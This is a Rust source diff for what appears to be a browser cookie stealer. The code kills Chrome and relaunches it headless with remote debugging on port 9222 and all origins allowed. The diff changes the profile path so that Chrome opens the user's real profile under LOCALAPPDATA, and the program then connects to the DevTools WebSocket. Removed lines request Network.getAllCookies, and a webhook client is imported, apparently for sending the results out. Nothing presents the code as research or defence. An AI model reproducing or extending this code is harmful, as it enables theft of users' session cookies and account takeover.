@@ -11,17 +11,11 @@ use tokio_tungstenite::{connect_async, tungstenite};
 use url::Url;
 use web_sys;
 use webhook::client::WebhookClient;
-use websocket::{ClientBuilder, Message};
 
-const OS: &str = env::consts::OS;
+// const OS: &str = env::consts::OS;
 const DEBUG_PORT: u32 = 9222;
 const CHROME_PATH: &str = r#"C:\Program Files\Google\Chrome\Application\chrome.exe"#; // Update with your Chrome path
-const USER_DATA_DIR: &str = r#"C:\path\to\user\data\dir"#;
-#[derive(Debug)]
-struct TempCookie {
-    host_key: String,
-    encypter_value: String,
-}
+const USER_DATA_DIR: &str = r#"\google\chrome\User Data"#;
 
 #[tokio::main]
 pub async fn main() -> Result<(), reqwest::Error> {
@@ -32,20 +26,6 @@ pub async fn main() -> Result<(), reqwest::Error> {
 
     dbg!("{}", &url);
     let url = Url::parse(&url).expect("Failed to parse WebSocket URL");
-    // let mut client = ClientBuilder::new(&url)
-    //     .unwrap()
-    //     .connect_insecure()
-    //     .unwrap();
-    // let payload = json!({
-    //     "id": 1,
-    //     "method": "Network.getAllCookies"
-    // })
-    // .to_string();
-    // client.send_message(&Message::text(payload)).unwrap();
-    // if let Ok(message) = client.recv_message() {
-    //     println!("Received: {:?}", message);
-    // }
-    // let _ = client.shutdown();
     let (ws_stream, _) = connect_async(url).await.unwrap();
     println!("Connected to WebSocket!");
     let (mut sink, mut stream) = ws_stream.split();
@@ -95,12 +75,14 @@ fn kill_chrome() {
 }
 
 fn start_debugged_chrome() {
+    let localappdata = env::var("LOCALAPPDATA").unwrap();
+    let user_data_dir = localappdata + USER_DATA_DIR;
     let child = Command::new(CHROME_PATH)
         .args(&[
             &format!("--remote-debugging-port={}", DEBUG_PORT),
             "--remote-allow-origins=*",
             "--headless",
-            &format!("--user-data-dir={}", USER_DATA_DIR),
+            &format!("--user-data-dir={}", user_data_dir),
         ])
         .stdout(Stdio::null())
         .stderr(Stdio::null())
